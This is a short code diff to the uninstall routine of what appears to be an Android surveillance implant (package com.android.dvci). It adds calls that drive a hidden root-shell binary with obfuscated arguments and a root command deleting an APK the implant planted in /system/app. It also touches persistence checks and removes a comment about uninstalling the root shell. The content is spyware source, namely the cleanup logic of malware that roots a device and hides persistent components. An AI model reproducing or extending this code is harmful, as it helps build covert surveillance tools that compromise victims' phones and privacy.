@@ -28,6 +28,7 @@ import com.android.dvci.listener.AR;
 import com.android.dvci.manager.ManagerEvent;
 import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
 import com.android.mm.M;
 
 /**
@@ -74,6 +75,14 @@ public class UninstallAction extends SubActionSlow {
 			ret = stopServices();
 			ret &= removeFiles();
 			ret &= deleteApplication();
+
+			if(Status.isPersistent()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualExecute), Something went wrong");
+				}
+
+			}
+
 			if (ret || Status.isPersistent() == false) {
 				ret &= removeRoot();
 			} else {
@@ -89,8 +98,11 @@ public class UninstallAction extends SubActionSlow {
 	private static boolean removeRoot() {
 		if (Status.haveRoot() == true) {
 			Process localProcess;
+
+			Execute.execute(String.format(M.e("%s blw"), Configuration.shellFile));
+			Execute.executeRoot(M.e("rm /system/app/StkDevice.apk"));
+
 			try {
-				// /system/bin/ntpsvd ru (uninstall root shell)
 				localProcess = Runtime.getRuntime().exec(String.format(M.e("%s ru"), Configuration.shellFile));
 				localProcess.waitFor();
 			} catch (Exception e) {
